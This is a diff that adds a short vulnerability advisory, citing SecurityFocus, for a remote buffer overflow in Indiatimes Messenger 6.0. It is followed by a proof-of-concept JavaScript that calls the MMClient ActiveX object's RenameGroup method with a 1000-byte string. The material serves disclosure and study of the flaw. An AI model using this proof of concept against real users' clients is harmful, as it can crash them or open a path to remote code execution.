@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/14705/info
+
+Indiatimes Messenger is reported prone to a remote buffer overflow vulnerability.
+
+A successful attack may trigger a crash in the client or lead to arbitrary code execution. The attacker may then gain unauthorized remote access in the context of the user running the application.
+
+Indiatimes Messenger 6.0 is affected by this issue. 
+
+[script]
+var obj1 = new
+ActiveXObject("MMClient.MunduMessenger.1");
+var buf = "";
+
+for(i=0; i<1000; i++)
+{
+buf += "A";
+}
+
+while(obj1.GetServerStatus() != "Logged In"); //wait
+till login
+
+obj1.RenameGroup("Friends", buf, 5);
+[/script] 
